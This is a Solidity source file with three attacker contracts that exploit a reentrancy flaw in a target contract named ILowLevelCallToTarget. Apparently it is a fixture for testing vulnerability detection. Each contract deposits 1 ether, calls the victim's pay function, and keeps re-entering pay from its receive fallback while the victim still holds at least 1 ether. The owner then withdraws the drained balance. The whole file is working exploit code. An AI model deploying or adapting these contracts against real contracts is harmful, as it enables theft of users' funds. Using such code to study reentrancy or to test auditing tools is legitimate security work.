// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../interfaces/ILowLevelCallToTarget.sol';

contract LowLevelCallToTargetAttacker {
    ILowLevelCallToTarget public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToTarget(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.pay();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.pay();
        }
    }
}

contract LowLevelCallToTargetAttacker2 {
    // LowLevelCallToTargetAttacker2: calls c.pay with address parameter
    ILowLevelCallToTarget2 public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToTarget2(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.pay(address(this));
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.pay(address(this));
        }
    }
}

contract LowLevelCallToTargetAttacker3 {
    // LowLevelCallToTargetAttacker3: sets victim address after deployment
    ILowLevelCallToTarget public c;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setVictim(address _c) public {
        require(msg.sender == owner, "Only owner can set victim");
        c = ILowLevelCallToTarget(_c);
    }

    function getVictim() public view returns (address) {
        return address(c);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.pay();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.pay();
        }
    }
}